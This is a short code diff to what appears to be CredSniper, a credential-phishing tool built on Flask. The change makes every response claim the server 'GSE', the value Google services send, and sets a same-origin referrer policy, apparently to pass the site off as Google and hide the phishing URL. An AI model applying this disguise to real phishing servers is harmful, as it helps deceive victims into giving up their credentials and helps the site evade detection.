@@ -114,7 +114,14 @@ class CredSniper():
             dt = time.strftime('%Y-%m-%d %H:%M')
             print('[{}] {}'.format(dt, message))
 
-app = Flask(__name__)
+class localFlask(Flask):
+    def process_response(self, response):
+        #Every response will be processed here first
+        response.headers['server'] = "GSE"
+        response.headers['Referrer-Policy'] = 'same-origin'
+        return(response)
+
+app = localFlask(__name__)
 cs = CredSniper()
 
 @app.errorhandler(401)
